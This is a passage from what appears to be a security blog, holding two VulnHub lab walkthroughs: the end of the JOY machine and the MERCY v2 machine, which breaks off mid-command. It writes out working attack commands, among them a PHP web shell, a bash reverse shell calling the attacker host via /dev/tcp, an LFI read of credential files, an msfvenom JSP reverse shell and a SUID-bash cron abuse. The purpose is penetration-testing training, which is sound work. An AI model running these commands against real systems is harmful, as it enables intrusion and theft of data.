|     Params: <span class="nt">--listen</span> <span class="nt">--user</span> tftp <span class="nt">--address</span> 0.0.0.0:36969 <span class="nt">--secure</span> /home/patrick  
...
</code></pre></div></div>

<h3 id="tftpd-enumeration">TFTPD Enumeration</h3>
<p>Then I logged into the TFTPd service and downloaded the <strong>control_version</strong> file, and we see that it contains the versions of the services, and the new path of the webroot directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>tftp 192.168.179.133 36969
tftp&gt; get version_control
Received 419 bytes <span class="k">in </span>0.0 seconds
tftp&gt; quit

root@kali:~<span class="nv">$ </span><span class="nb">cat </span>version_control 
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations <span class="k">in </span>this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.

</code></pre></div></div>
<p>After investigating for vulnerabilities in the ProFTPd service I found that it is vulnerable to Mod_Copy Command Execution, allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands, you can download the exploit <a href="https://www.exploit-db.com/exploits/49908">here</a>.</p>

<h2 id="exploitation">Exploitation</h2>

<h3 id="proftpd-service">ProFTPd Service</h3>

<p>As I have mounted the FTP resource to our attacking machine, simply I redirect a simple webshell to the FTP’s home directory, and then copy the webshell to the webroot with netcat, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'&lt;?php passthru($_REQUEST["cmd"]); ?&gt;'</span> <span class="o">&gt;</span> /mnt/ftp/z.php
root@kali:~<span class="nv">$ </span>nc 192.168.179.133 21
220 The Good Tech Inc. FTP Server
SITE CPFR /home/ftp/z.php
350 File or directory exists, ready <span class="k">for </span>destination name
SITE CPTO /var/www/tryingharderisjoy/z.php
250 Copy successful
quit
221 Goodbye.
</code></pre></div></div>
<p>I requested the webshell by running the <strong>ls -la</strong> command, and we see that this was written with root permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.179.133/z.php?cmd=ls%20-la'</span>
total 28
drwxr-xr-x 3 www-data www-data 4096 Jul  8 11:31 <span class="nb">.</span>
drwxr-xr-x 3 root     root     4096 Jan 27  2019 ..
drwxr-xr-x 8 www-data www-data 4096 Jan  6  2019 ossec
<span class="nt">-rw-r--r--</span> 1 root     root       37 Jul  8 11:31 z.php
</code></pre></div></div>

<p>Having this in mind we create a cron job with a bash reverse shell that it will execute every minute and then we redirect it to the mounted ftp directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"\n'</span> <span class="o">&gt;</span> /mnt/ftp/sysstatus
</code></pre></div></div>
<p>After we transfer it to the <strong>/etc/cron.d/</strong> directory, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc 192.168.179.133 21
220 The Good Tech Inc. FTP Server
SITE CPFR /home/ftp/sysstatus
350 File or directory exists, ready <span class="k">for </span>destination name
SITE CPTO /etc/cron.d/sysstatus
250 Copy successful
quit
221 Goodbye.
</code></pre></div></div>
<p>We set up a netcat listener on port 443 and after a minute we have a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.133] 50138
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>5051<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@JOY:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@JOY:~# <span class="nb">uname</span> <span class="nt">-a</span>
Linux JOY 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux</span>
root@JOY:~# <span class="nb">cat </span>proof.txt
Never grant <span class="nb">sudo </span>permissions on scripts that perform system functions!
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - digitalworld.local MERCY v2</h1>
	<p class="post-date text-bold text-upcase">
	<span>May 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a machine dedicated to Offensive Security for the PWK course.</p>

<p><strong>Author:</strong> Donavan</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/">https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/</a></p>

<h2 id="informtion-gathering">Informtion Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>First we identify the ip address of the target, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.<span class="k">*</span> 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-02 19:24 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.132
Host is up <span class="o">(</span>0.00070s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:0C:29:3B:F2:CE <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00024s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:F6:A4:B3 <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>6.00 seconds
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Then I proceed to perform a port scan with the purpose to detect open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-T5</span> <span class="nt">-p1-65535</span> <span class="nt">-v</span> 192.168.179.132 <span class="nt">-oG</span> nmap-tcp-all-ports.txt
...
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   filtered http
110/tcp  open     pop3
139/tcp  open     netbios-ssn
143/tcp  open     imap
445/tcp  open     microsoft-ds
993/tcp  open     imaps
995/tcp  open     pop3s
8080/tcp open     http-proxy
MAC Address: 00:0C:29:3B:F2:CE <span class="o">(</span>VMware<span class="o">)</span>
</code></pre></div></div>
<p>As we see in the output the ports 22 and 80 are filtered, it will be that the firewall rules are intervening.</p>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>With nmap we carry out the enumeration of versions and services.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-v</span> <span class="nt">-p53</span>,110,139,143,445,993,995,8080 192.168.179.132 <span class="nt">-oN</span> tcp-services.txt
...
PORT     STATE SERVICE     VERSION
53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
| dns-nsid:                                                                                                                         
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu                                                                                                                         
110/tcp  open  pop3        Dovecot pop3d                                                                                                                           
|_pop3-capabilities: STLS SASL PIPELINING TOP AUTH-RESP-CODE RESP-CODES UIDL CAPA                                                                                  
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
143/tcp  open  imap        Dovecot imapd <span class="o">(</span>Ubuntu<span class="o">)</span>
|_imap-capabilities: STARTTLS IDLE SASL-IR have LITERAL+ more ENABLE post-login LOGIN-REFERRALS ID capabilities listed OK Pre-login LOGINDISABLEDA0001 IMAP4rev1
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
993/tcp  open  ssl/imaps?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114 fd64 1d28 7465 e1c8 8fde af46 c767
|_SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>995/tcp  open  ssl/pop3s?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114 fd64 1d28 7465 e1c8 8fde af46 c767
|_SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:                                               
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS       
|_  Potentially risky methods: PUT DELETE                     
|_http-open-proxy: Proxy might be redirecting requests        
| http-robots.txt: 1 disallowed entry                         
|_/tryharder/tryharder                                        
|_http-server-header: Apache-Coyote/1.1                       
|_http-title: Apache Tomcat                                   
MAC Address: 00:0C:29:3B:F2:CE <span class="o">(</span>VMware<span class="o">)</span>                       
Service Info: Host: MERCY<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
...
</code></pre></div></div>

<h3 id="samba-enumeration">Samba Enumeration</h3>

<p>The following instruction lists the shared resources of the samba service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbmap <span class="nt">-H</span> 192.168.179.132
<span class="o">[</span>+] Guest session       IP: 192.168.179.132:445 Name: unknown 
    Disk                       Permissions     Comment
    <span class="nt">----</span>                       <span class="nt">-----------</span>     <span class="nt">-------</span>
    print<span class="nv">$ </span>                    NO ACCESS       Printer Drivers
    qiu                        NO ACCESS
    IPC<span class="nv">$ </span>                      NO ACCESS       IPC Service <span class="o">(</span>MERCY server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
</code></pre></div></div>

<p>Then we enumerate the samba users and domains.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>rpcclient 192.168.179.132 <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[pleadformercy] rid:[0x3e8]
user:[qiu] rid:[0x3e9]
rpcclient <span class="nv">$&gt;</span> enumdomains
name:[MERCY] idx:[0x0]
name:[Builtin] idx:[0x1]
</code></pre></div></div>

<h3 id="enumerating-port-8080">Enumerating Port 8080</h3>

<p>Browsing the web service on port 8080 we find the tomcat index page.</p>

<p><img src="/assets/images/mercy/screenshot-1.png" alt="" /></p>

<p>Then we check the robots file on the web page and find the following resource:</p>

<p><img src="/assets/images/mercy/screenshot-2.png" alt="" /></p>

<p>We request the resource <strong>/tryharder/tryharder</strong> and we find content encode in base64.</p>

<p><img src="/assets/images/mercy/screenshot-3.png" alt="" /></p>

<p>We download the base64 file and decode it, and I find a message where it especifies that one of the employes is using as password <strong>password</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.179.132:8080/tryharder/tryharder
root@kali:~<span class="nv">$ </span><span class="nb">base64</span> <span class="nt">-d</span> tryharder 
It<span class="s1">'s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee'</span>s desk! As silly as it may be, the employee pleaded <span class="k">for </span>mercy when we threatened to fire her.

No fluffy bunnies <span class="k">for </span>those <span class="nb">who set </span>insecure passwords and endanger the enterprise.
</code></pre></div></div>

<h3 id="accessing-the-samba-service">Accessing the Samba Service</h3>

<p>I try to access the samba service with the credentials <strong>qiu:password</strong> and we access this.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbclient //192.168.179.132/qiu <span class="nt">-U</span> <span class="s1">'qiu'</span>
Enter WORKGROUP<span class="se">\q</span>iu<span class="s1">'s password:

Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Aug 31 14:07:00 2018
  ..                                  D        0  Mon Nov 19 11:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 08:19:34 2018
  .public                            DH        0  Sun Aug 26 09:23:24 2018
  .bash_history                       H      163  Fri Aug 31 14:11:34 2018
  .cache                             DH        0  Fri Aug 31 13:22:05 2018
  .private                           DH        0  Sun Aug 26 11:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 08:19:34 2018
  .profile                            H      675  Sun Aug 26 08:19:34 2018
</span></code></pre></div></div>

<p>For convenience I will mount the shared resource to the attacking machine as shown in the following instructions:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>/mnt/smb
root@kali:~<span class="nv">$ </span>mount <span class="nt">-t</span> cifs //192.168.179.132/qiu  /mnt/smb <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>qiu,password<span class="o">=</span>password,rw 
root@kali:~<span class="nv">$ </span><span class="nb">cd</span> /mnt/smb 
</code></pre></div></div>
<p>I found in the following path a file with system configurations, including the knocking daemon configuration, as we can see in the following output the port sequence that we have to try to connect to open ports 80 and 22.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/smb<span class="nv">$ </span><span class="nb">cat</span> .private/opensesame/config       
Here are settings <span class="k">for </span>your perusal.                         
                                                                     
Port Knocking Daemon Configuration                                
                                                                         
<span class="o">[</span>options]                                                            
        UseSyslog                                                  
                                                                    
<span class="o">[</span>openHTTP]                                                               
        sequence    <span class="o">=</span> 159,27391,4                                  
        seq_timeout <span class="o">=</span> 100                                                 
        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 80 <span class="nt">-j</span> ACCEPT
        tcpflags    <span class="o">=</span> syn                                                    
                                                                               
<span class="o">[</span>closeHTTP]                                                                 
        sequence    <span class="o">=</span> 4,27391,159                                             
        seq_timeout <span class="o">=</span> 100                                                       
        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-D</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 80 <span class="nt">-j</span> ACCEPT
        tcpflags    <span class="o">=</span> syn                                                    
                                                                           
<span class="o">[</span>openSSH]                                                                    
        sequence    <span class="o">=</span> 17301,28504,9999                                    
        seq_timeout <span class="o">=</span> 100                                                    
        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
        tcpflags    <span class="o">=</span> syn                                                  
                                                                              
<span class="o">[</span>closeSSH]                                                                   
        sequence    <span class="o">=</span> 9999,28504,17301                                        
        seq_timeout <span class="o">=</span> 100                                                    
        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-D</span> iNPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
        tcpflags    <span class="o">=</span> syn 
...
</code></pre></div></div>

<p>I developed a small port knocking script in python, as shown below:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">f"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [Ip] [Port1 Port2 Port3]"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">connection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">ip</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:]:</span>
        <span class="n">connection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>

    <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
</code></pre></div></div>

<p>We execute the script as follows to open ports 22 and 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./knoking.py 192.168.179.132 159 27391 4
Done
root@kali:~<span class="nv">$ </span>./knoking.py 192.168.179.132 17301 28504 9999
Done
</code></pre></div></div>

<p>We check that ports 22 and 80 are open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-p22</span>,80 192.168.179.132              
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</code></pre></div></div>

<h3 id="enumerating-port-80">Enumerating Port 80</h3>

<p>I browse the web page and I can’t find something interesting.</p>

<p><img src="/assets/images/mercy/screenshot-4.png" alt="" /></p>

<p>I executed gobuster for enumerate hidden files and directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/smb<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.132/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> txt <span class="nt">-e</span>
...
http://192.168.179.132/time                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 79]
http://192.168.179.132/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 50]
</code></pre></div></div>

<p>Checking the robots file I find two directories, as shown in the following  picture:</p>

<p><img src="/assets/images/mercy/screenshot-5.png" alt="" /></p>

<p>When I request the <strong>nomercy</strong> resource it redirects me to the RIPS page that’s a static source code analyser for vulnerabilities.</p>

<p><img src="/assets/images/mercy/screenshot-6.png" alt="" /></p>

<p>Searching for vulnerabilities for this RIPS version, I found that this is vulnerable to Local File Inclusion, so I downloaded the exploit database proof of concept, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/18660
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>18660
<span class="c"># RIPS &lt;= 0.53 Multiple Local File Inclusion Vulnerabilities</span>
<span class="c"># Google Dork: allintitle: "RIPS - A static source code analyser for vulnerabilities in PHP scripts"</span>
<span class="c"># Althout this script is not intended to be accesible from internet, there</span>
are some websites that host it.
<span class="c"># Download: http://sourceforge.net/projects/rips-scanner/</span>
<span class="c"># Date: 23/03/12</span>
<span class="c"># Contact: mattdch0@gmail.com</span>
<span class="c"># Follow: @mattdch</span>
<span class="c"># www.localh0t.com.ar</span>


File: /windows/code.php
<span class="o">=======================</span>

102: file <span class="nv">$lines</span> <span class="o">=</span> file<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
    96: <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'file'</span><span class="o">]</span><span class="p">;</span>

PoC:
http://localhost/rips/windows/code.php?file<span class="o">=</span>../../../../../../etc/passwd

File: /windows/function.php
<span class="o">===========================</span>

    64: file <span class="nv">$lines</span> <span class="o">=</span> file<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
        58: <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'file'</span><span class="o">]</span><span class="p">;</span>

PoC:
http://localhost/rips/windows/function.php?file<span class="o">=</span>../../../../../../etc/passwd<span class="o">(</span>will
<span class="nb">read </span>the first line of the file<span class="o">)</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>

<h3 id="local-file-inclusion">Local File Inclusion</h3>

<p>We perform the following request with the browser to verify the proof of concept, and we comprobe that it’s vulnerable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.132/nomercy/windows/code.php?file<span class="o">=</span>../../../../../../etc/passwd 
</code></pre></div></div>

<p><img src="/assets/images/mercy/screenshot-7.png" alt="" /></p>

<p>If we remember Tomcat has a file where its users are defined, this is located in <strong>/etc/tomcat7/tomcat-users.xml</strong>, so let’s download its content.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.132/nomercy/windows/code.php?file<span class="o">=</span>../../../../../../etc/tomcat7/tomcat-users.xml
</code></pre></div></div>

<p><img src="/assets/images/mercy/screenshot-8.png" alt="" /></p>

<p>And we found two usernames with their passwords.</p>

<h3 id="tomcat-web-page">Tomcat Web Page</h3>

<p>I tried log in with this credentials to SSH service but this doesn’t work, so I logged into the Tomcat <strong>manager-webapp</strong> with the username <strong>thisisasuperduperlonguser</strong> and password <strong>heartbreakisinevitable</strong>.</p>

<p><img src="/assets/images/mercy/screenshot-9.png" alt="" /></p>

<p>Logged into the administration panel we need to upload a reverse shell, on the attacking machine we create a war reverse shell as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="nt">-o</span> reverse.war
</code></pre></div></div>

<p>Created our reverse shell we have to upload it, as shown in the following pictures:</p>

<p><img src="/assets/images/mercy/screenshot-10.png" alt="" /></p>

<p><img src="/assets/images/mercy/screenshot-11.png" alt="" /></p>

<p><strong>Getting a reverse shell</strong></p>

<p>Ones our war reverse shell is uploaded, we need set up an nc listener on port 443 waiting for incoming connections.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>
<p>Then we perform the following curl request and we get a shell, also with python we spawn a TTY shell, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.179.132:8080/reverse/'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.132] 50554
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>116<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>126<span class="o">(</span>tomcat7<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>126<span class="o">(</span>tomcat7<span class="o">)</span>
which python
/usr/bin/python
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
tomcat7@MERCY:/var/lib/tomcat7<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
<span class="nb">uname</span> <span class="nt">-a</span>
Linux MERCY 4.4.0-31-generic <span class="c">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux</span>
</code></pre></div></div>
<p>Enumerating in the web root directory we find the <strong>time</strong> file that contains the current date, it’s possible that a cron job is redirecting the results to this file, and if we see the date when listing this file, the last time that it was modified, it was a few moments ago.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat7@MERCY:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
...
<span class="nt">-rw-r--r--</span> 1 www-data www-data   79 May  2 23:36 <span class="nb">time</span>
</code></pre></div></div>
<p>We switch to the user <strong>fluffy</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat7@MERCY:/var/www/html<span class="nv">$ </span>su fluffy
Password: freakishfluffybunny

<span class="nv">$ </span>bash
fluffy@MERCY:/var/www/html<span class="nv">$ </span>
</code></pre></div></div>
<p>In the patrick home directory I found the <strong>.private/secret/timeclock</strong> file, that contains a bash script the same that redirects the date, other text and assigns www-data permissions to the <strong>time</strong> file, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fluffy@MERCY:~/.private/secrets<span class="nv">$ </span><span class="nb">cat </span>timeclock
<span class="c">#!/bin/bash</span>

<span class="nv">now</span><span class="o">=</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s2">"The system time is: </span><span class="nv">$now</span><span class="s2">."</span> <span class="o">&gt;</span> ../../../../../var/www/html/time
<span class="nb">echo</span> <span class="s2">"Time check courtesy of LINUX"</span> <span class="o">&gt;&gt;</span> ../../../../../var/www/html/time
<span class="nb">chown </span>www-data:www-data ../../../../../var/www/html/time
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<h3 id="abussing-cron-job">Abussing cron job</h3>

<p>To get root we copy the bash binary to the /temp directory, we assign SUID permissions and redirect to the <strong>timeclock</strong> file, a few moments later we see that the bash binary is in the /temp directory and finally we execute it and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fluffy@MERCY:~/.private/secrets<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'cp /bin/bash /tmp/ &amp;&amp; chmod 4777 /tmp/bash'</span> <span class="o">&gt;&gt;</span> timeclock
fluffy@MERCY:~/.private/secrets<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /tmp/bash
<span class="nt">-rwsrwxrwx</span> 1 root root 986672 May  2 16:48 /tmp/bash
fluffy@MERCY:~/.private/secrets<span class="nv">$ </span>/tmp/bash <span class="nt">-p</span>
bash-4.3# <span class="nb">id
